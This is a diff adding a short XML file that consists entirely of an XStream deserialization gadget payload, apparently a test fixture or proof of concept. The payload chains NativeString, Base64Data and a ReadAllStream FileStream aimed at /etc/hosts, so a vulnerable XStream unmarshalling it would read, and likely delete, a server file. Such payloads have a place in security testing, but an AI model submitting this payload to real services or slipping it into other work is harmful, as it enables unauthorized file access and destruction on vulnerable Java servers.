@@ -1,0 +1,20 @@
+<map>
+    <entry>
+      <jdk.nashorn.internal.objects.NativeString>
+        <flags>0</flags>
+        <value class='com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data'>
+          <dataHandler>
+            <dataSource class='com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource'>
+              <contentType>text/plain</contentType>
+              <is class='com.sun.xml.internal.ws.util.ReadAllStream$FileStream'>
+                <tempFile>/etc/hosts</tempFile>
+              </is>
+            </dataSource>
+            <transferFlavors/>
+          </dataHandler>
+          <dataLen>0</dataLen>
+        </value>
+      </jdk.nashorn.internal.objects.NativeString>
+      <string>test</string>
+    </entry>
+</map>
